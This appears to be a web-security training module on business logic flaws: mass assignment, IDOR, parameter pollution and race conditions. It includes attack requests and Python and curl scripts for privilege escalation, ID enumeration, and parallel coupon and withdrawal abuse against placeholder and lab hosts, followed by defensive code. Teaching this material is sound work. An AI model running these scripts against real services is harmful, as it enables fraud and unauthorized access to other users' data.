# Day 2 - Module 4: Business Logic & Authorization Flaws

**Duration:** 2 hours
**Prerequisites:** Module 3 completed

---

## Slide 1: Business Logic Vulnerabilities

### What Are Business Logic Flaws?

Vulnerabilities in the application's workflow and business rules, not necessarily in the code itself.

**Characteristics:**
- Application works "as coded" but not "as intended"
- Difficult to detect with automated scanners
- Require understanding of business context
- Often lead to critical impact

**Examples:**
- Price manipulation in e-commerce
- Privilege escalation through workflow abuse
- Race conditions in financial transactions
- Account enumeration
- Insecure Direct Object References (IDOR)

---

## Slide 2: Mass Assignment Vulnerabilities

### What is Mass Assignment?

When an application automatically binds HTTP parameters to internal object properties without filtering.

### Attack Example

**Vulnerable Code (Ruby on Rails):**
```ruby
# User model
class User < ApplicationRecord
  # Attributes: username, email, password, is_admin, credits
end

# Controller
def create
  @user = User.new(params[:user])  # Mass assignment!
  @user.save
end
```

**Normal Registration:**
```http
POST /users HTTP/1.1
Content-Type: application/json

{
  "username": "alice",
  "email": "alice@example.com",
  "password": "password123"
}
```

**Malicious Registration:**
```http
POST /users HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@example.com",
  "password": "password123",
  "is_admin": true,           // Extra parameter!
  "credits": 1000000          // Extra parameter!
}
```

### Real-World Examples

**GitHub Mass Assignment (2012)**
```http
POST /rails/info/properties HTTP/1.1

{
  "user_id": 1234,
  "public_key[user_id]": 1  // Admin user ID
}

# Allowed adding SSH key to any user's account
```

**Testing Methodology:**

```python
import requests

# Normal request
normal_data = {
    'username': 'test1',
    'email': 'test1@example.com',
    'password': 'pass123'
}

response1 = requests.post('https://target.com/api/register',
                         json=normal_data)

# Test with additional parameters
extra_params = {
    'username': 'test2',
    'email': 'test2@example.com',
    'password': 'pass123',
    'role': 'admin',
    'is_admin': True,
    'admin': True,
    'is_premium': True,
    'credits': 999999,
    'balance': 999999,
    'user_type': 'admin',
    'account_type': 'premium'
}

response2 = requests.post('https://target.com/api/register',
                         json=extra_params)

# Login and check privileges
login = requests.post('https://target.com/api/login',
                     json={'username': 'test2', 'password': 'pass123'})

# Check if extra parameters were assigned
profile = requests.get('https://target.com/api/profile',
                      cookies=login.cookies)
print(profile.json())
```

---

## Slide 3: Second-Order IDOR

### What is IDOR?

**Insecure Direct Object Reference:** Access to resources by manipulating object identifiers without authorization checks.

### Classic IDOR Example

```http
# View your own profile
GET /api/users/1234/profile HTTP/1.1

# View someone else's profile (IDOR)
GET /api/users/5678/profile HTTP/1.1
```

### What is Second-Order IDOR?

IDOR where the vulnerable reference isn't in the URL but in stored data or subsequent requests.

### Attack Scenario

**Step 1: Register with Malicious User ID**
```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@example.com",
  "referrer_id": "999999"  // Admin user ID
}
```

**Step 2: Trigger Second-Order Effect**
```http
GET /api/dashboard HTTP/1.1
Cookie: session=attacker_session

# Application loads user data
# Uses stored referrer_id to fetch referrer details
# SELECT * FROM users WHERE id = referrer_id
# Returns admin user data to attacker!
```

### Advanced IDOR Techniques

**Parameter Pollution:**
```http
GET /api/users/1234/delete?user_id=1234&user_id=5678 HTTP/1.1

# Some frameworks use first parameter
# Others use last parameter
# Test which one is used for authorization!
```

**Array Injection:**
```http
POST /api/delete-account HTTP/1.1
Content-Type: application/json

{
  "user_id": [1234, 5678, 9012]  // Delete multiple accounts?
}
```

**Numeric ID Manipulation:**
```bash
# Negative numbers
GET /api/users/-1/profile

# Large numbers
GET /api/users/999999999999/profile

# Floating point
GET /api/users/1234.5/profile

# Hexadecimal
GET /api/users/0x4D2/profile

# Scientific notation
GET /api/users/1e3/profile
```

**GUID/UUID Prediction:**
```python
import uuid

# UUID v1 - Time-based (predictable!)
uuid1 = uuid.uuid1()
print(uuid1)  # Can predict based on timestamp + MAC

# Test if UUIDs are sequential or predictable
uuids = [
    create_account(),
    create_account(),
    create_account()
]

# Analyze for patterns
```

---

## Slide 4: HTTP Parameter Pollution (HPP)

### What is HPP?

Exploiting applications that process HTTP parameters inconsistently.

### Server-Side Behavior Differences

```http
GET /api/search?category=books&category=electronics HTTP/1.1
```

**How different frameworks handle duplicate parameters:**

| Framework | Result |
|-----------|--------|
| PHP | `category = 'electronics'` (last value) |
| JSP/Servlet | `category = 'books'` (first value) |
| ASP.NET | `category = 'books,electronics'` (concatenated) |
| Node.js | `category = ['books', 'electronics']` (array) |
| Python Flask | `category = ['books', 'electronics']` (array) |

### Attack Scenarios

**Scenario 1: WAF Bypass**
```http
# WAF blocks
GET /api/users?role=admin HTTP/1.1

# WAF allows (focuses on first parameter)
GET /api/users?role=user&role=admin HTTP/1.1

# Backend uses last parameter → privilege escalation!
```

**Scenario 2: Payment Manipulation**
```http
POST /checkout HTTP/1.1

price=1000&price=1&item_id=12345

# If payment gateway uses first price (1000)
# But inventory system uses last price (1)
# → Buy expensive item for $1
```

**Scenario 3: Access Control Bypass**
```http
GET /api/documents?user_id=1234&user_id=5678 HTTP/1.1

# Authorization check uses first user_id (1234 - attacker)
# Data retrieval uses second user_id (5678 - victim)
# → Access to victim's documents
```

### Testing for HPP

```python
import requests

# Test endpoint with duplicate parameters
params = [
    ('user_id', '1234'),  # Attacker's ID
    ('user_id', '5678')   # Victim's ID
]

# Method 1: Using tuples (preserves order)
response = requests.get('https://target.com/api/profile',
                       params=params)

# Method 2: URL construction
url = 'https://target.com/api/profile?user_id=1234&user_id=5678'
response = requests.get(url)

# Analyze response
print(response.json())

# Test different parameter positions
test_cases = [
    'user_id=attacker&user_id=victim',
    'user_id=victim&user_id=attacker',
    'user_id=attacker&user_id=victim&user_id=attacker',
]

for params in test_cases:
    response = requests.get(f'https://target.com/api/profile?{params}')
    print(f"Params: {params}")
    print(f"Response: {response.text}\n")
```

---

## Slide 5: Race Conditions in Web Applications

### What are Race Conditions?

Vulnerabilities that occur when multiple requests execute simultaneously, causing unexpected behavior.

### Classic Race Condition Example

**Vulnerable Code:**
```python
def withdraw(user_id, amount):
    # Step 1: Check balance
    balance = get_balance(user_id)

    # Step 2: Verify sufficient funds
    if balance >= amount:
        # Step 3: Deduct amount
        new_balance = balance - amount
        update_balance(user_id, new_balance)
        return True

    return False
```

**Attack:**
```
Request 1: withdraw(user_id=123, amount=1000)
Request 2: withdraw(user_id=123, amount=1000)

Timeline:
t1: Request 1 checks balance = $1000 ✓
t2: Request 2 checks balance = $1000 ✓  (balance not updated yet!)
t3: Request 1 deducts $1000 → balance = $0
t4: Request 2 deducts $1000 → balance = -$1000  (overdraft!)
```

### Attack Scenarios

**Scenario 1: Coupon Code Reuse**
```python
# Vulnerable coupon redemption
def redeem_coupon(user_id, code):
    if is_valid_coupon(code):
        if not is_used(code):  # Race condition here!
            apply_discount(user_id, code)
            mark_as_used(code)  # Too late!
```

**Attack:**
```bash
# Send 10 simultaneous requests
seq 1 10 | xargs -P 10 -I {} curl -X POST \
  https://target.com/api/redeem-coupon \
  -H "Cookie: session=abc123" \
  -d "code=SAVE50"

# Coupon applied 10 times before marked as used!
```

**Scenario 2: Limited Quantity Purchase**
```python
def purchase_item(item_id, quantity):
    stock = get_stock(item_id)

    if stock >= quantity:  # Race condition!
        create_order(item_id, quantity)
        update_stock(item_id, stock - quantity)
        return "Success"

    return "Out of stock"
```

**Scenario 3: Vote/Like Manipulation**
```python
def like_post(user_id, post_id):
    if not has_liked(user_id, post_id):  # Race condition!
        add_like(user_id, post_id)
        increment_like_count(post_id)
```

### Exploiting Race Conditions

**Tool 1: Burp Suite Intruder (Single Packet Attack)**
```
1. Send request to Intruder
2. Set attack type: "Single Packet Attack" (requires Burp Extension)
3. Send 20+ requests simultaneously
4. Analyze responses for success
```

**Tool 2: Turbo Intruder (Burp Extension)**
```python
# Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)

    # Send 50 identical requests simultaneously
    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

**Tool 3: Custom Python Script**
```python
import requests
import concurrent.futures

def send_request():
    return requests.post('https://target.com/api/redeem-coupon',
                        cookies={'session': 'abc123'},
                        json={'code': 'SAVE50'})

# Send 50 requests in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(send_request) for _ in range(50)]

    for future in concurrent.futures.as_completed(futures):
        response = future.result()
        print(f"Status: {response.status_code}, Body: {response.text}")
```

**Tool 4: race-condition-exploit.py**
```python
import asyncio
import aiohttp

async def exploit_race_condition():
    async with aiohttp.ClientSession() as session:
        # Prepare 100 identical requests
        tasks = []
        for i in range(100):
            task = session.post(
                'https://target.com/api/withdraw',
                json={'amount': 1000},
                cookies={'session': 'user123'}
            )
            tasks.append(task)

        # Execute all requests simultaneously
        responses = await asyncio.gather(*tasks)

        # Count successful responses
        success_count = sum(1 for r in responses if r.status == 200)
        print(f"Successful withdrawals: {success_count}")

# Run the attack
asyncio.run(exploit_race_condition())
```

---

## Slide 6: Lab 4 - Business Logic Exploitation

### Lab Environment

**Target:** `https://lab4.webapp-training.local`

**Accounts:**
- `buyer1@lab.local:password123` (Balance: $1000)
- `seller@lab.local:password456`

### Part 1: Mass Assignment (30 min)

**Task 1: User Registration**
```bash
# Normal registration
curl -X POST https://lab4.webapp-training.local/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test1",
    "email": "test1@lab.local",
    "password": "pass123"
  }'

# Test with extra parameters
curl -X POST https://lab4.webapp-training.local/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test2",
    "email": "test2@lab.local",
    "password": "pass123",
    "is_admin": true,
    "role": "admin",
    "credits": 999999,
    "premium": true
  }'

# Login and check profile
curl -X POST https://lab4.webapp-training.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "test2", "password": "pass123"}' \
  -c cookies.txt

curl https://lab4.webapp-training.local/api/profile \
  -b cookies.txt
```

**Task 2: Profile Update**
```bash
# Try adding admin parameters during profile update
curl -X PUT https://lab4.webapp-training.local/api/profile \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "email": "newemail@lab.local",
    "is_admin": true,
    "account_balance": 1000000
  }'
```

### Part 2: IDOR & HPP (30 min)

**Task 1: Find IDOR in API**
```bash
# View your orders
curl https://lab4.webapp-training.local/api/orders/me \
  -b cookies.txt

# Try accessing other user's orders
curl https://lab4.webapp-training.local/api/orders/1 \
  -b cookies.txt

curl https://lab4.webapp-training.local/api/orders/2 \
  -b cookies.txt

# Test IDOR in different endpoints
curl https://lab4.webapp-training.local/api/users/1/documents \
  -b cookies.txt
```

**Task 2: HTTP Parameter Pollution**
```bash
# Test duplicate parameters
curl "https://lab4.webapp-training.local/api/orders?user_id=1&user_id=2" \
  -b cookies.txt

# Test in POST body
curl -X POST https://lab4.webapp-training.local/api/transfer \
  -b cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "from_account=1&to_account=2&to_account=3&amount=100"
```

### Part 3: Race Condition Exploitation (45 min)

**Task 1: Identify Race-Vulnerable Endpoint**
```bash
# Coupon redemption endpoint
# Each coupon should only work once
curl -X POST https://lab4.webapp-training.local/api/redeem-coupon \
  -b cookies.txt \
  -d "code=DISCOUNT50"
```

**Task 2: Exploit with Parallel Requests**
```python
#!/usr/bin/env python3

import requests
import concurrent.futures

# Login first
session = requests.Session()
login = session.post('https://lab4.webapp-training.local/api/login',
                    json={'username': 'buyer1@lab.local',
                         'password': 'password123'})

print("Initial balance:")
balance = session.get('https://lab4.webapp-training.local/api/balance')
print(balance.json())

def redeem_coupon():
    return session.post('https://lab4.webapp-training.local/api/redeem-coupon',
                       data={'code': 'DISCOUNT50'})

# Send 20 parallel requests
print("\nSending 20 parallel coupon redemptions...")
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(redeem_coupon) for _ in range(20)]

    success_count = 0
    for future in concurrent.futures.as_completed(futures):
        response = future.result()
        if response.status_code == 200:
            success_count += 1
            print(f"✓ Success: {response.text}")

print(f"\nTotal successful redemptions: {success_count}")

print("\nFinal balance:")
balance = session.get('https://lab4.webapp-training.local/api/balance')
print(balance.json())
```

**Task 3: Stock Manipulation**
```python
import requests
import concurrent.futures

session = requests.Session()
session.post('https://lab4.webapp-training.local/api/login',
            json={'username': 'buyer1@lab.local',
                 'password': 'password123'})

def purchase_limited_item():
    return session.post('https://lab4.webapp-training.local/api/purchase',
                       json={'item_id': 999, 'quantity': 1})

# Item has stock of 1
# Try to purchase 10 times simultaneously
print("Attempting to purchase limited stock item 10 times...")
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(purchase_limited_item) for _ in range(10)]

    success_count = sum(1 for f in futures if f.result().status_code == 200)

print(f"Successfully purchased: {success_count} items (stock was only 1!)")
```

### Deliverables

1. **Mass Assignment Findings:**
   - Vulnerable parameters identified
   - Privilege escalation PoC
   - Impact assessment

2. **IDOR/HPP Exploitation:**
   - Endpoints vulnerable to IDOR
   - HPP test results
   - Data accessed without authorization

3. **Race Condition Exploit:**
   - Vulnerable endpoint identified
   - Number of successful parallel requests
   - Financial impact calculation
   - Exploit script

---

## Slide 7: Real-World Case Studies

### Case Study 1: HackerOne Mass Assignment

**Vulnerability:** Mass assignment in profile update
**Impact:** Privilege escalation to admin
**Details:**
```http
PUT /api/v1/users/me HTTP/1.1

{
  "email": "attacker@example.com",
  "reputation": 999999,
  "is_admin": true
}
```

### Case Study 2: Starbucks Race Condition

**Vulnerability:** Race condition in gift card transfer
**Impact:** Unlimited balance
**Attack:**
- Transfer $5 from card A to card B
- Send 100 parallel requests
- Card B receives $500 (100× $5)
- Card A only debited once

**Bounty:** Critical severity

### Case Study 3: IDOR in Healthcare Portal

**Vulnerability:** Patient ID in URL without authorization
**Impact:** HIPAA violation, access to medical records
**Attack:**
```bash
# View own records
GET /api/patients/1234/records

# Enumerate all patient records
for i in range(1, 100000):
    GET /api/patients/{i}/records
```

---

## Slide 8: Defense & Mitigation

### Preventing Mass Assignment

```python
# Bad: Accepting all parameters
user = User(**request.json)

# Good: Whitelist allowed fields
ALLOWED_FIELDS = ['username', 'email', 'password']
user_data = {k: v for k, v in request.json.items()
            if k in ALLOWED_FIELDS}
user = User(**user_data)

# Better: Use DTOs/Schemas
from marshmallow import Schema, fields

class UserRegistrationSchema(Schema):
    username = fields.Str(required=True)
    email = fields.Email(required=True)
    password = fields.Str(required=True)

schema = UserRegistrationSchema()
user_data = schema.load(request.json)  # Only allowed fields
user = User(**user_data)
```

### Preventing IDOR

```python
# Bad: No authorization check
@app.route('/api/documents/<int:doc_id>')
def get_document(doc_id):
    doc = Document.get(doc_id)
    return jsonify(doc)

# Good: Verify ownership
@app.route('/api/documents/<int:doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.get(doc_id)

    if doc.owner_id != current_user.id and not current_user.is_admin:
        abort(403)  # Forbidden

    return jsonify(doc)

# Better: Use UUIDs instead of sequential IDs
# And still verify ownership!
```

### Preventing HPP

```python
# Parse parameters consistently
# Always use first, last, or concatenate - be consistent

# Flask example - use getlist for multi-value params
user_ids = request.args.getlist('user_id')

if len(user_ids) > 1:
    # Reject ambiguous requests
    return "Multiple user_id parameters not allowed", 400

user_id = user_ids[0] if user_ids else None
```

### Preventing Race Conditions

```python
# Use database transactions with proper locking
from sqlalchemy import select

def withdraw(user_id, amount):
    with db.transaction():
        # Lock the row for update
        user = db.session.query(User).with_for_update().get(user_id)

        if user.balance >= amount:
            user.balance -= amount
            db.session.commit()
            return True
        else:
            db.session.rollback()
            return False

# Use atomic operations
# Redis example
def redeem_coupon(code, user_id):
    # Atomic check-and-set
    result = redis.set(f"coupon:{code}:used", user_id, nx=True)

    if result:
        # Coupon successfully claimed
        apply_discount(user_id, code)
        return True
    else:
        # Coupon already used
        return False

# Use distributed locks for critical sections
from redis import Redis
from redis.lock import Lock

redis = Redis()

def critical_operation(user_id):
    lock = Lock(redis, f"lock:user:{user_id}", timeout=5)

    if lock.acquire(blocking=False):
        try:
            # Perform operation
            perform_critical_operation(user_id)
        finally:
            lock.release()
    else:
        return "Operation in progress, try again"
```

---

## Instructor Notes

### Timing
- Slides 1-2: 25 min (Business logic intro, Mass assignment)
- Slide 3: 20 min (IDOR)
- Slide 4: 20 min (HPP)
- Slide 5: 25 min (Race conditions)
- Slide 6: 45 min (Lab)
- Slides 7-8: 15 min (Cases & defense)

### Lab Setup
- E-commerce-like application
- Coupon/discount system
- Limited stock items
- User profiles with roles

### Key Takeaways
- Business logic flaws require understanding context
- Automated scanners miss these vulnerabilities
- Race conditions need concurrent testing
- Defense requires proper design, not just code fixes
